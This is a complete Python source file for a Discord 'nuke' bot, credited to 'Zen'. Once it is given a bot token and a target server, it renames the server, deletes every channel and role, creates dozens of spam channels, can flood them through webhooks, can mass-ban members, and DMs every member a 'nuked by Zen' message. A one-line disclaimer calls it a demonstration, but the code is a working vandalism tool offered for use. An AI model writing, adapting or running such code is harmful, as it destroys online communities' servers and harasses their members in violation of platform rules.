#!/usr/bin/env python3
# This script is only to demonstrate Python Discord API interaction
# Using this on real Discord servers without permission is against Discord's ToS

# Dependencies
import discord
from discord.ext import commands
import asyncio
import os
import sys
import json
import time
from colorama import init, Fore
import threading

# Initialize colorama
init(autoreset=True)

# ASCII Art Loader
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    clear_screen()
    banner = f"""
{Fore.RED}███████╗███████╗███╗   ██╗    ███╗   ██╗██╗   ██╗██╗  ██╗███████╗
{Fore.RED}╚══███╔╝██╔════╝████╗  ██║    ████╗  ██║██║   ██║██║ ██╔╝██╔════╝
{Fore.RED}  ███╔╝ █████╗  ██╔██╗ ██║    ██╔██╗ ██║██║   ██║█████╔╝ █████╗  
{Fore.RED} ███╔╝  ██╔══╝  ██║╚██╗██║    ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  
{Fore.RED}███████╗███████╗██║ ╚████║    ██║ ╚████║╚██████╔╝██║  ██╗███████╗
{Fore.RED}╚══════╝╚══════╝╚═╝  ╚═══╝    ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝
                                                         
{Fore.RED}===================== Made By https://github.com/Zenxoxz ====================="""
    print(banner)
                                                         
# Configuration file path
CONFIG_FILE = 'nuke_config.json'

# Default configuration
DEFAULT_CONFIG = {
    "bot_token": "",
    "owner_id": "",
    "target_guild_id": "",
    "prefix": "*",
    "nickname_change": "Nuked by Zen",
    "channel_name": "nuked-by-zen",
    "server_name": "NUKED BY ZEN",
    "role_name": "Nuked by Zen",
    "channel_message": "This server has been nuked by Zen",
    "dm_message": "Your server has been nuked by Zen",
    "webhook_spam": False,
    "webhook_message": "Raided by Zen",
    "delete_channels": True,
    "delete_roles": True,
    "ban_members": False,
    "mass_channels": True,
    "channel_count": 50
}

# Load configuration
def load_config():
    try:
        if os.path.exists(CONFIG_FILE):
            with open(CONFIG_FILE, 'r') as f:
                config = json.load(f)
                # Make sure all keys exist (in case config file is outdated)
                for key, value in DEFAULT_CONFIG.items():
                    if key not in config:
                        config[key] = value
                return config
        return DEFAULT_CONFIG.copy()
    except Exception as e:
        print(f"{Fore.RED}Error loading config: {e}")
        return DEFAULT_CONFIG.copy()

# Save configuration
def save_config(config):
    try:
        with open(CONFIG_FILE, 'w') as f:
            json.dump(config, f, indent=4)
        return True
    except Exception as e:
        print(f"{Fore.RED}Error saving config: {e}")
        return False

# Variables
class NukeBot:
    def __init__(self):
        self.config = load_config()
        self.bot = None
        self.running = False
    
    def log(self, type_log, message):
        types = {
            "info": f"{Fore.CYAN}[INFO]{Fore.RESET}",
            "warn": f"{Fore.YELLOW}[WARN]{Fore.RESET}",
            "success": f"{Fore.GREEN}[SUCCESS]{Fore.RESET}",
            "error": f"{Fore.RED}[ERROR]{Fore.RESET}"
        }
        print(f"{types.get(type_log, '[LOG]')} {message}")
    
    def setup_bot(self):
        # Create discord intents (permissions)
        intents = discord.Intents.all()
        
        # Initialize Bot
        self.bot = commands.Bot(command_prefix=self.config["prefix"], intents=intents)
        
        # Setup events
        @self.bot.event
        async def on_ready():
            self.log("success", f"Bot is ready and connected to Discord API as {self.bot.user.name}")
            self.log("info", f"Use the prefix '{self.config['prefix']}' with command 'start' in any channel of the target server")
            self.log("info", "Press Ctrl+C to return to menu")
        
        @self.bot.event
        async def on_command_error(ctx, error):
            if isinstance(error, commands.CommandNotFound):
                return
            self.log("error", f"Command error: {str(error)}")
        
        # Nuke command
        @self.bot.command(name="start")
        async def nuke_command(ctx):
            # Only run if it's the owner
            if str(ctx.author.id) == self.config["owner_id"]:
                # Check if it's the target guild
                if not self.config["target_guild_id"] or str(ctx.guild.id) == self.config["target_guild_id"]:
                    self.log("info", f"Nuke command received from {ctx.author}.")
                    await self.execute_nuke(ctx)
                else:
                    self.log("warn", f"Command used in non-target guild. Ignoring.")
            else:
                self.log("warn", f"Unauthorized user {ctx.author} tried to use nuke command.")
    
    async def execute_nuke(self, ctx):
        guild = ctx.guild
        
        self.log("info", f"Starting nuke process on server: {guild.name}...")
        
        # Change server name
        try:
            await guild.edit(name=self.config["server_name"])
            self.log("success", "Server name changed")
        except Exception as e:
            self.log("error", f"Failed to change server name: {e}")
        
        # Delete all channels if enabled
        if self.config["delete_channels"]:
            self.log("info", "Deleting all channels...")
            for channel in guild.channels:
                try:
                    await channel.delete()
                    self.log("info", f"Deleted channel: {channel.name}")
                except Exception as e:
                    self.log("error", f"Failed to delete channel {channel.name}: {e}")
        
        # Delete all roles if enabled
        if self.config["delete_roles"]:
            self.log("info", "Deleting all roles...")
            for role in guild.roles:
                if role.position < guild.me.top_role.position and role != guild.default_role:
                    try:
                        await role.delete()
                        self.log("info", f"Deleted role: {role.name}")
                    except Exception as e:
                        self.log("error", f"Failed to delete role {role.name}: {e}")
        
        # Create mass channels if enabled
        if self.config["mass_channels"]:
            self.log("info", f"Creating {self.config['channel_count']} channels...")
            for i in range(self.config["channel_count"]):
                try:
                    channel = await guild.create_text_channel(self.config["channel_name"])
                    self.log("info", f"Created channel: {channel.name}")
                    
                    # Send message to channel
                    await channel.send(self.config["channel_message"])
                    
                    # Create webhook and spam if enabled
                    if self.config["webhook_spam"]:
                        try:
                            webhook = await channel.create_webhook(name="Zen's Nuke")
                            
                            # Send 5 messages through webhook
                            for _ in range(15):
                                await webhook.send(
                                    content=self.config["webhook_message"],
                                    username="Zen's Nuke",
                                    avatar_url="https://i.imgur.com/l37uwZa.png"
                                )
                            self.log("info", f"Webhook spam in {channel.name}")
                        except Exception as e:
                            self.log("error", f"Failed to create webhook: {e}")
                            
                except Exception as e:
                    self.log("error", f"Failed to create channel: {e}")
                    
        # Ban members if enabled
        if self.config["ban_members"]:
            self.log("info", "Banning members...")
            for member in guild.members:
                if member.id != int(self.config["owner_id"]) and member.id != self.bot.user.id:
                    if guild.me.top_role.position > member.top_role.position:
                        try:
                            await member.ban(reason="Nuke")
                            self.log("info", f"Banned {member.name}")
                        except Exception as e:
                            self.log("error", f"Failed to ban {member.name}: {e}")
        
        # DM all members the message
        self.log("info", "Sending DMs to members...")
        for member in guild.members:
            if member.id != int(self.config["owner_id"]) and member.id != self.bot.user.id:
                try:
                    await member.send(self.config["dm_message"])
                    self.log("info", f"DM sent to {member.name}")
                except Exception as e:
                    self.log("error", f"Failed to DM {member.name}: {e}")
        
        self.log("success", "Nuke process completed")
    
    def start(self):
        if not self.config["bot_token"]:
            print(f"{Fore.RED}Error: Bot token not configured. Please configure settings first.")
            input(f"{Fore.RED}Press Enter to return to the menu...")
            return False
        
        if not self.config["owner_id"]:
            print(f"{Fore.RED}Error: Owner ID not configured. Please configure settings first.")
            input(f"{Fore.RED}Press Enter to return to the menu...")
            return False
        
        print(f"{Fore.CYAN}Connecting to Discord...")
        
        # Setup bot
        self.setup_bot()
        
        # Run the bot in a separate thread so we can return to menu
        self.running = True
        bot_thread = threading.Thread(target=self._run_bot)
        bot_thread.daemon = True
        bot_thread.start()
        
        # Wait for Ctrl+C
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            print(f"{Fore.YELLOW}Stopping bot...")
            self.running = False
            
        return True
    
    def _run_bot(self):
        try:
            asyncio.set_event_loop(asyncio.new_event_loop())
            loop = asyncio.get_event_loop()
            loop.run_until_complete(self.bot.start(self.config["bot_token"]))
        except discord.errors.LoginFailure:
            self.log("error", "Failed to login: Invalid token")
            self.running = False
        except Exception as e:
            self.log("error", f"An error occurred: {str(e)}")
            self.running = False

# Initialize bot
nuke_bot = NukeBot()

# Menu options
def display_menu():
    print_banner()
    print(f"{Fore.CYAN}\n[1] Start Bot")
    print(f"{Fore.CYAN}[2] Configure Settings")
    print(f"{Fore.CYAN}[3] Show Current Settings")
    print(f"{Fore.CYAN}[4] Exit")
    
    option = input(f"{Fore.YELLOW}\nSelect an option: ")
    
    if option == "1":
        start_bot()
    elif option == "2":
        configure_settings()
    elif option == "3":
        show_settings()
    elif option == "4":
        print(f"{Fore.RED}Exiting...")
        sys.exit(0)
    else:
        print(f"{Fore.RED}Invalid option. Press Enter to continue...")
        input()
        display_menu()

def show_settings():
    clear_screen()
    print(f"{Fore.CYAN}========== CURRENT SETTINGS ==========")
    print(f"{Fore.CYAN}Bot Token: {'********' if nuke_bot.config['bot_token'] else 'Not set'}")
    print(f"{Fore.CYAN}Owner ID: {nuke_bot.config['owner_id'] or 'Not set'}")
    print(f"{Fore.CYAN}Target Guild ID: {nuke_bot.config['target_guild_id'] or 'Not set'}")
    print(f"{Fore.CYAN}Command Prefix: {nuke_bot.config['prefix']}")
    print(f"{Fore.CYAN}Nickname Change: {nuke_bot.config['nickname_change']}")
    print(f"{Fore.CYAN}Channel Name: {nuke_bot.config['channel_name']}")
    print(f"{Fore.CYAN}Server Name: {nuke_bot.config['server_name']}")
    print(f"{Fore.CYAN}Role Name: {nuke_bot.config['role_name']}")
    print(f"{Fore.CYAN}Channel Message: {nuke_bot.config['channel_message']}")
    print(f"{Fore.CYAN}DM Message: {nuke_bot.config['dm_message']}")
    print(f"{Fore.CYAN}Webhook Spam: {'Enabled' if nuke_bot.config['webhook_spam'] else 'Disabled'}")
    
    if nuke_bot.config['webhook_spam']:
        print(f"{Fore.CYAN}Webhook Message: {nuke_bot.config['webhook_message']}")
    
    print(f"{Fore.CYAN}Delete Channels: {'Enabled' if nuke_bot.config['delete_channels'] else 'Disabled'}")
    print(f"{Fore.CYAN}Delete Roles: {'Enabled' if nuke_bot.config['delete_roles'] else 'Disabled'}")
    print(f"{Fore.CYAN}Ban Members: {'Enabled' if nuke_bot.config['ban_members'] else 'Disabled'}")
    print(f"{Fore.CYAN}Mass Channels: {'Enabled' if nuke_bot.config['mass_channels'] else 'Disabled'}")
    
    if nuke_bot.config['mass_channels']:
        print(f"{Fore.CYAN}Channel Count: {nuke_bot.config['channel_count']}")
    
    input(f"{Fore.YELLOW}\nPress Enter to return to menu...")
    display_menu()

def configure_settings():
    clear_screen()
    print(f"{Fore.CYAN}========== CONFIGURE SETTINGS ==========")
    print(f"{Fore.CYAN}[1] Bot Token")
    print(f"{Fore.CYAN}[2] Owner ID")
    print(f"{Fore.CYAN}[3] Target Guild ID")
    print(f"{Fore.CYAN}[4] Text Settings (Names & Messages)")
    print(f"{Fore.CYAN}[5] Feature Toggles")
    print(f"{Fore.CYAN}[6] Return to Main Menu")
    
    option = input(f"{Fore.YELLOW}\nSelect an option: ")
    
    if option == "1":
        nuke_bot.config["bot_token"] = input(f"{Fore.YELLOW}Enter Bot Token: ")
        save_config(nuke_bot.config)
        print(f"{Fore.GREEN}Bot token updated! Press Enter to continue...")
        input()
        configure_settings()
    elif option == "2":
        nuke_bot.config["owner_id"] = input(f"{Fore.YELLOW}Enter Owner ID: ")
        save_config(nuke_bot.config)
        print(f"{Fore.GREEN}Owner ID updated! Press Enter to continue...")
        input()
        configure_settings()
    elif option == "3":
        nuke_bot.config["target_guild_id"] = input(f"{Fore.YELLOW}Enter Target Guild ID (leave blank to target any server): ")
        save_config(nuke_bot.config)
        print(f"{Fore.GREEN}Target Guild ID updated! Press Enter to continue...")
        input()
        configure_settings()
    elif option == "4":
        configure_text_settings()
    elif option == "5":
        configure_features()
    elif option == "6":
        display_menu()
    else:
        print(f"{Fore.RED}Invalid option. Press Enter to continue...")
        input()
        configure_settings()

def configure_text_settings():
    clear_screen()
    print(f"{Fore.CYAN}========== TEXT SETTINGS ==========")
    print(f"{Fore.CYAN}[1] Command Prefix")
    print(f"{Fore.CYAN}[2] Nickname Change")
    print(f"{Fore.CYAN}[3] Channel Name")
    print(f"{Fore.CYAN}[4] Server Name Change")
    print(f"{Fore.CYAN}[5] Role Name")
    print(f"{Fore.CYAN}[6] Channel Message")
    print(f"{Fore.CYAN}[7] DM Message")
    print(f"{Fore.CYAN}[8] Webhook Message")
    print(f"{Fore.CYAN}[9] Return to Config Menu")
    
    option = input(f"{Fore.YELLOW}\nSelect an option: ")
    
    if option == "1":
        nuke_bot.config["prefix"] = input(f"{Fore.YELLOW}Enter command prefix: ")
        save_config(nuke_bot.config)
        print(f"{Fore.GREEN}Command prefix updated! Press Enter to continue...")
        input()
        configure_text_settings()
    elif option == "2":
        nuke_bot.config["nickname_change"] = input(f"{Fore.YELLOW}Enter nickname to set for members: ")
        save_config(nuke_bot.config)
        print(f"{Fore.GREEN}Nickname setting updated! Press Enter to continue...")
        input()
        configure_text_settings()
    elif option == "3":
        nuke_bot.config["channel_name"] = input(f"{Fore.YELLOW}Enter channel name to create: ")
        save_config(nuke_bot.config)
        print(f"{Fore.GREEN}Channel name updated! Press Enter to continue...")
        input()
        configure_text_settings()
    elif option == "4":
        nuke_bot.config["server_name"] = input(f"{Fore.YELLOW}Enter server name to set: ")
        save_config(nuke_bot.config)
        print(f"{Fore.GREEN}Server name updated! Press Enter to continue...")
        input()
        configure_text_settings()
    elif option == "5":
        nuke_bot.config["role_name"] = input(f"{Fore.YELLOW}Enter role name to create: ")
        save_config(nuke_bot.config)
        print(f"{Fore.GREEN}Role name updated! Press Enter to continue...")
        input()
        configure_text_settings()
    elif option == "6":
        nuke_bot.config["channel_message"] = input(f"{Fore.YELLOW}Enter message to send in channels: ")
        save_config(nuke_bot.config)
        print(f"{Fore.GREEN}Channel message updated! Press Enter to continue...")
        input()
        configure_text_settings()
    elif option == "7":
        nuke_bot.config["dm_message"] = input(f"{Fore.YELLOW}Enter message to DM to members: ")
        save_config(nuke_bot.config)
        print(f"{Fore.GREEN}DM message updated! Press Enter to continue...")
        input()
        configure_text_settings()
    elif option == "8":
        nuke_bot.config["webhook_message"] = input(f"{Fore.YELLOW}Enter message for webhook spam: ")
        save_config(nuke_bot.config)
        print(f"{Fore.GREEN}Webhook message updated! Press Enter to continue...")
        input()
        configure_text_settings()
    elif option == "9":
        configure_settings()
    else:
        print(f"{Fore.RED}Invalid option. Press Enter to continue...")
        input()
        configure_text_settings()

def configure_features():
    clear_screen()
    print(f"{Fore.CYAN}========== FEATURE TOGGLES ==========")
    print(f"{Fore.CYAN}[1] Webhook Spam: {'Enabled' if nuke_bot.config['webhook_spam'] else 'Disabled'}")
    print(f"{Fore.CYAN}[2] Delete Channels: {'Enabled' if nuke_bot.config['delete_channels'] else 'Disabled'}")
    print(f"{Fore.CYAN}[3] Delete Roles: {'Enabled' if nuke_bot.config['delete_roles'] else 'Disabled'}")
    print(f"{Fore.CYAN}[4] Ban Members: {'Enabled' if nuke_bot.config['ban_members'] else 'Disabled'}")
    print(f"{Fore.CYAN}[5] Mass Channels: {'Enabled' if nuke_bot.config['mass_channels'] else 'Disabled'}")
    
    if nuke_bot.config['mass_channels']:
        print(f"{Fore.CYAN}[6] Channel Count: {nuke_bot.config['channel_count']}")
    else:
        print(f"{Fore.CYAN}[6] Channel Count (Currently disabled)")
        
    print(f"{Fore.CYAN}[7] Return to Config Menu")
    
    option = input(f"{Fore.YELLOW}\nSelect an option to toggle: ")
    
    if option == "1":
        nuke_bot.config["webhook_spam"] = not nuke_bot.config["webhook_spam"]
        save_config(nuke_bot.config)
        print(f"{Fore.GREEN}Webhook Spam {'enabled' if nuke_bot.config['webhook_spam'] else 'disabled'}! Press Enter to continue...")
        input()
        configure_features()
    elif option == "2":
        nuke_bot.config["delete_channels"] = not nuke_bot.config["delete_channels"]
        save_config(nuke_bot.config)
        print(f"{Fore.GREEN}Delete Channels {'enabled' if nuke_bot.config['delete_channels'] else 'disabled'}! Press Enter to continue...")
        input()
        configure_features()
    elif option == "3":
        nuke_bot.config["delete_roles"] = not nuke_bot.config["delete_roles"]
        save_config(nuke_bot.config)
        print(f"{Fore.GREEN}Delete Roles {'enabled' if nuke_bot.config['delete_roles'] else 'disabled'}! Press Enter to continue...")
        input()
        configure_features()
    elif option == "4":
        nuke_bot.config["ban_members"] = not nuke_bot.config["ban_members"]
        save_config(nuke_bot.config)
        print(f"{Fore.GREEN}Ban Members {'enabled' if nuke_bot.config['ban_members'] else 'disabled'}! Press Enter to continue...")
        input()
        configure_features()
    elif option == "5":
        nuke_bot.config["mass_channels"] = not nuke_bot.config["mass_channels"]
        save_config(nuke_bot.config)
        print(f"{Fore.GREEN}Mass Channels {'enabled' if nuke_bot.config['mass_channels'] else 'disabled'}! Press Enter to continue...")
        input()
        configure_features()
    elif option == "6":
        try:
            count = int(input(f"{Fore.YELLOW}Enter number of channels to create: "))
            if count > 0:
                nuke_bot.config["channel_count"] = count
                save_config(nuke_bot.config)
                print(f"{Fore.GREEN}Channel count updated to {count}! Press Enter to continue...")
            else:
                print(f"{Fore.RED}Channel count must be greater than 0. Press Enter to continue...")
        except ValueError:
            print(f"{Fore.RED}Invalid input. Please enter a number. Press Enter to continue...")
        input()
        configure_features()
    elif option == "7":
        configure_settings()
    else:
        print(f"{Fore.RED}Invalid option. Press Enter to continue...")
        input()
        configure_features()

def start_bot():
    print_banner()
    print(f"{Fore.YELLOW}Starting bot...")
    
    # Start the bot
    success = nuke_bot.start()
    
    if not success:
        display_menu()
    else:
        # After bot is stopped
        print(f"{Fore.YELLOW}\nBot has been stopped. Press Enter to return to menu...")
        input()
        display_menu()

# Entry point
if __name__ == "__main__":
    try:
        display_menu()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}Exiting...")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Fore.RED}An unexpected error occurred: {str(e)}")
        print(f"{Fore.RED}Press Enter to exit...")
        input()
        sys.exit(1)
